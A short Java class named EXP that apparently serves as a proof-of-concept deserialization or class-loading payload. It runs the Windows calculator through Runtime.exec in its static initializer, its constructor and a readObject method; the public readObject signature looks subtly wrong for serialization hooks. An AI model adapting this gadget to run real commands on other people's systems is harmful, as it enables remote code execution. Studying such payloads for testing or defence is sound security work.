import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;

public class EXP implements Serializable {
    static{
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    public EXP() {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    public void readObject(ObjectInputStream ois) throws IOException {
        Runtime.getRuntime().exec("calc");
    }
}
